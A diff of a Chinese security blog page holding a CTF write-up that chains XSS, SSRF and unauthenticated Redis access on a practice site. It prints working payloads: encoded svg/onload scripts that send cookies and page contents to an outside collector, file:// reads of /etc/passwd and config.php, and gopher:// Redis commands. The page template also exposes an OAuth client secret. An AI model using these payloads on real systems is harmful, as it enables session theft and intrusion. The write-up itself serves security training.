@@ -15,7 +15,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Sky&#39;s blog</title>
+    <title>xss-&gt;ssrf-&gt;redis · Sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -70,6 +70,8 @@
 
     <link rel="preload" href= /css/style.css?v=20180630 as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= /css/mobile.css?v=20180630 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -194,12 +196,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Sky&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">xss->ssrf->redis</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>Sky's blog</a>
 </header>
@@ -213,24 +226,68 @@
 
 
 
+height:50vh;
+
 >
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post.png)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            xss->ssrf->redis
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">1,472</span> / Reading time: <span class="post-count">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/08/17</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -331,41 +388,105 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/08/15/一道CTF题引发的思考-sql注入/" >
-            
-                <span>一道CTF题引发的思考-sql注入</span>
-        </a>
-        <div class="abstract-content">
-            
-文章首发在 https://xz.aliyun.com/t/2583
+            <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>文章首发在 <a href="https://www.anquanke.com/post/id/156377" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156377</a></p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近有空，想到曾经刷的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/scoreboard/</span><br></pre></td></tr></table></figure></p>
+<p>还有一组新题没做，于是看了一下，发现是xss-&gt;ssrf-&gt;redis的，觉得很有趣，于是做了一下，记录一下writeup<br>以前的web题解可以看这篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2018/01/07/hackme%E7%BD%91%E7%AB%99%E8%BE%B9%E5%81%9A%E8%BE%B9%E8%AE%B0%E5%BD%95/</span><br></pre></td></tr></table></figure></p>
+<p>给出本次题目的链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xssrf.hackme.inndy.tw/index.php</span><br></pre></td></tr></table></figure></p>
+<h2 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a>xssme</h2><p>首先是第一关，探查了一下功能，大概4项：</p>
+<ul>
+<li>注册</li>
+<li>登录</li>
+<li>发email</li>
+<li>看email</li>
+</ul>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>上来扫了波目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xssrf.hackme.inndy.tw/robots.txt</span><br></pre></td></tr></table></figure></p>
+<p>发现信息泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /config.php</span><br><span class="line">Disallow: /you/cant/read/config.php/can/you?</span><br><span class="line">Disallow: /backup.zip</span><br></pre></td></tr></table></figure></p>
+<p>下载压缩包后，发现有密码，猜想应该是要读config.php中的关键信息，才能获得压缩包密码</p>
+<h3 id="xss探测"><a href="#xss探测" class="headerlink" title="xss探测"></a>xss探测</h3><p>于是回到主题，题目名称既然叫xssme，那么应该就是xss攻击了<br>于是首先探测一下过滤<br><img src="/images/2018-08-14-11-12-07.png" alt=""><br>发现测试的时候会直接告诉我们过滤的关键字，这样就更容易探测了<br>既然<code>&lt;Script</code>不行，那我们试试<code>&lt;img&gt;</code><br><img src="/images/2018-08-14-11-16-03.png" alt=""><br>发现同样不行，那么既然<code>onerror</code>不行，我再试试<code>onload</code>？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-08-14-12-01-05.png" alt=""><br>发现也不行，那我再变一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload&gt;</span><br></pre></td></tr></table></figure></p>
+<p>发现似乎没有被过滤，于是尝试payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&apos;http://vps_ip:23333&apos;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-08-14-11-24-15.png" alt=""><br>发现收到信息<br><img src="/images/2018-08-14-11-25-01.png" alt=""><br>于是开始构造payload打一波cookie</p>
+<h3 id="收获flag"><a href="#收获flag" class="headerlink" title="收获flag"></a>收获flag</h3><p>payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&apos;http://ugelgr.ceye.io/?&apos;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-08-14-11-05-51.png" alt=""><br>解码后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=9crkuhdqs9b1jkslebpieprr86; FLAG_XSSME=FLAG&#123;Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;/script&gt;&#125;; FLAG_2=IN_THE_REDIS</span><br></pre></td></tr></table></figure></p>
+<p>于是愉快的获得了第一个flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;/script&gt;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>并且获得提示，flag2在redis中</p>
+<h2 id="xssrf-leak"><a href="#xssrf-leak" class="headerlink" title="xssrf leak"></a>xssrf leak</h2><p>结合题目之前的暗示<br><img src="/images/2018-08-14-11-47-49.png" alt=""><br>应该是要以admin身份登入吧，既然有PHPSESSID那我们试试吧<br><img src="/images/2018-08-14-11-48-31.png" alt=""><br>很无奈的得到了这样的提示，必须从本地登录<br>起初我认为需要修改http header，但是尝试了多种都发现不行，后来灵光一闪，一拍脑袋，是不是傻<br>我们直接利用xss去本地访问，再将页面内容打出来就好了呀！<br>于是思考到之前的思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload&gt;</span><br></pre></td></tr></table></figure></p>
+<p>构造出<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"document.location='http://ugelgr.ceye.io/?'+btoa(document.body.innerHTML)"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>想去打页面内容<br><img src="/images/2018-08-14-11-58-30.png" alt=""><br>但是发现了过滤<br>现在没办法了，只能思考编码绕过了，于是尝试将<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.location=&apos;http://ugelgr.ceye.io/?&apos;+btoa(document.body.innerHTML)</span><br></pre></td></tr></table></figure></p>
+<p>进行编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x3d;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x75;&amp;#x67;&amp;#x65;&amp;#x6c;&amp;#x67;&amp;#x72;&amp;#x2e;&amp;#x63;&amp;#x65;&amp;#x79;&amp;#x65;&amp;#x2e;&amp;#x69;&amp;#x6f;&amp;#x2f;&amp;#x3f;&amp;#x27;&amp;#x2b;&amp;#x62;&amp;#x74;&amp;#x6f;&amp;#x61;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x62;&amp;#x6f;&amp;#x64;&amp;#x79;&amp;#x2e;&amp;#x69;&amp;#x6e;&amp;#x6e;&amp;#x65;&amp;#x72;&amp;#x48;&amp;#x54;&amp;#x4d;&amp;#x4c;&amp;#x29;</span><br></pre></td></tr></table></figure></p>
+<p>尝试payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x3d;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x75;&amp;#x67;&amp;#x65;&amp;#x6c;&amp;#x67;&amp;#x72;&amp;#x2e;&amp;#x63;&amp;#x65;&amp;#x79;&amp;#x65;&amp;#x2e;&amp;#x69;&amp;#x6f;&amp;#x2f;&amp;#x3f;&amp;#x27;&amp;#x2b;&amp;#x62;&amp;#x74;&amp;#x6f;&amp;#x61;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x62;&amp;#x6f;&amp;#x64;&amp;#x79;&amp;#x2e;&amp;#x69;&amp;#x6e;&amp;#x6e;&amp;#x65;&amp;#x72;&amp;#x48;&amp;#x54;&amp;#x4d;&amp;#x4c;&amp;#x29;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>发现成功收到消息<br><img src="/images/2018-08-14-12-00-18.png" alt=""><br>解码后保存到本地html里打开<br><img src="/images/2018-08-14-12-03-21.png" alt=""><br>发现多了一个send request的功能，跟过去看代码<br><img src="/images/2018-08-14-12-03-46.png" alt=""><br>没错，是多了一个request.php<br>那么结合题目意思，应该是有ssrf，我想应该就是利用这里的request.php了吧<br>那么继续去读这个页面的html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.onreadystatechange=function()</span></span></span><br><span class="line"><span class="tag"><span class="string">&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.open("</span><span class="attr">GET</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.send</span>();</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>经过编码后发送，得到<br><img src="/images/2018-08-14-12-15-23.png" alt=""><br>同样解码后发现代码<br><img src="/images/2018-08-14-12-15-49.png" alt=""><br>应该xss的点就是在这里了<br>于是尝试file协议读<code>/etc/passwd</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.onreadystatechange=function()</span></span></span><br><span class="line"><span class="tag"><span class="string">&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.open("</span><span class="attr">POST</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.send</span>("<span class="attr">url</span>=<span class="string">file:///etc/passwd</span>");</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-08-14-12-21-32.png" alt=""><br>发现成功读取了<code>/etc/passwd</code><br>那么我们回想到最初的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /config.php</span><br><span class="line">Disallow: /you/cant/read/config.php/can/you?</span><br><span class="line">Disallow: /backup.zip</span><br></pre></td></tr></table></figure></p>
+<p>于是直接读config.php<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.onreadystatechange=function()</span></span></span><br><span class="line"><span class="tag"><span class="string">&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.open("</span><span class="attr">POST</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.send</span>("<span class="attr">url</span>=<span class="string">file:///var/www/html/config.php</span>");</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-08-14-12-24-47.png" alt=""><br>cool，于是我们拿到了第二个flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="xssrf-redis"><a href="#xssrf-redis" class="headerlink" title="xssrf redis"></a>xssrf redis</h3><p>只剩下最后一步打redis了<br>这里很容易就想到了gopher未授权访问打redis<br>上一题提示我们redis再25566端口，于是我们尝试访问一下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.onreadystatechange=function()</span></span></span><br><span class="line"><span class="tag"><span class="string">&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">xmlhttp.open("</span><span class="attr">POST</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">xmlhttp.send</span>("<span class="attr">url</span>=<span class="string">gopher://127.0.0.1:25566/_info%250a_quit</span>");</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>于是愉快的打出信息，发现果然是未授权访问<br><img src="/images/2018-08-14-13-53-45.png" alt=""><br>那么看看key有哪些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit&quot;);</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-08-14-14-04-06.png" alt=""><br>发现了flag<br>然后我们尝试读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_get%2520flag%250a_quit&quot;);</span><br></pre></td></tr></table></figure></p>
+<p>发现报错<br><img src="/images/2018-08-14-14-09-29.png" alt=""><br>发现类型错误了<br>那我们看看类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_type%2520flag%250a_quit&quot;);</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-08-14-14-11-15.png" alt=""><br>发现是个list<br>那我们看看长度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_llen%2520flag%250a_quit&quot;);</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-08-14-14-14-04.png" alt=""><br>发现是53<br>那我们可以愉快的读取list了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit&quot;);</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-08-14-14-16-21.png" alt=""><br>我们把它拼接起来<br><img src="/images/2018-08-14-14-18-12.png" alt=""><br>so cool<br>得到最后的flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Rediswithout authentication is easy to exploit&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>此题结束后，我对XSS的观点有了巨大的改变= =，实在是太强了</p>
 
-前言最近做培训和题目讲解的时候，做到bugku的一道题目，bugku的题目想必ctfer都已经耳熟能详了，网上的writeup铺天盖地。但我今天单独写了一篇文章来写一道题肯定是有原因的，其中一道题是这样的：1.网上铺天盖地的writeup写到：直接访问http://120.24.86.145:8007/web2/flag即可得到flag2.此题真坑，竟然是脑洞，访问flag文件就好了…..我看到题目价值200分，放在bugku众多web的后段，怎么看都不是一个脑洞访问一下就完事的题目于是开始了正规解法的思考
-信息搜...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/15</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
     </article>
+    <!-- license  -->
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/08/17/RealWorldCTF-Web/" title= RealWorldCTF-Web >
+                    <div class="nextTitle">RealWorldCTF-Web</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/08/17/浅析xml及其安全问题/" title= 浅析xml及其安全问题 >
+                    <div class="prevTitle">浅析xml及其安全问题</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-    <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/archives/2018/08/">&#60; PREV</a><a class="page-number" href="/archives/2018/08/">1</a><span class="page-number current">2</span>
-    </nav>
     
+<div id="container"></div>
+<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+        id: "Fri Aug 17 2018 11:00:40 GMT+0800", // 可选。默认为 location.href
+        owner: 'skyofkinglove',
+        repo: 'sky.github.io',
+        oauth: {
+            client_id: 'b7f45cf046d0fdec25c4',
+            client_secret: 'be2f9a33bd720bf5723cb6b7b23bd8dae88d7315',
+        },
+    })
+    gitment.render('container')
+
+</script>
+
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -434,6 +555,24 @@
     </div>
     <!-- toc -->
     
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xssme"><span class="toc-number">2.</span> <span class="toc-text">xssme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息搜集"><span class="toc-number">2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss探测"><span class="toc-number">2.2.</span> <span class="toc-text">xss探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#收获flag"><span class="toc-number">2.3.</span> <span class="toc-text">收获flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xssrf-leak"><span class="toc-number">3.</span> <span class="toc-text">xssrf leak</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xssrf-redis"><span class="toc-number">3.1.</span> <span class="toc-text">xssrf redis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">4.</span> <span class="toc-text">后记</span></a></li></ol>
+    </div>
+    
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
     <ul class="sidebar-tabs sidebar-tabs-active-0">
@@ -444,6 +583,32 @@
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -2769,62 +2934,62 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/2018/08/29/浅析xml及其安全问题/" >浅析xml及其安全问题</a>
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/浅析xml之xinclude-xslt/" >浅析xml之xinclude & xslt</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/28</span><a class="archive-post-title" href= "/2018/08/28/RealWorldCTF-Web/" >RealWorldCTF-Web</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/SOAP及相关漏洞研究/" >SOAP及相关漏洞研究</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/27</span><a class="archive-post-title" href= "/2018/08/27/php函数默认配置引发的安全问题/" >php函数默认配置引发的安全问题</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/php函数默认配置引发的安全问题/" >php函数默认配置引发的安全问题</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2018/08/26/Upload-labs&Upload Bypass Summarize/" >Upload-labs&Upload Bypass Summarize</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/RealWorldCTF-Web/" >RealWorldCTF-Web</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2018/08/26/MeePwn-Web-复现/" >MeePwn-Web-复现</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/xss-ssrf-redis/" >xss->ssrf->redis</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/SOAP及相关漏洞研究/" >SOAP及相关漏洞研究</a>
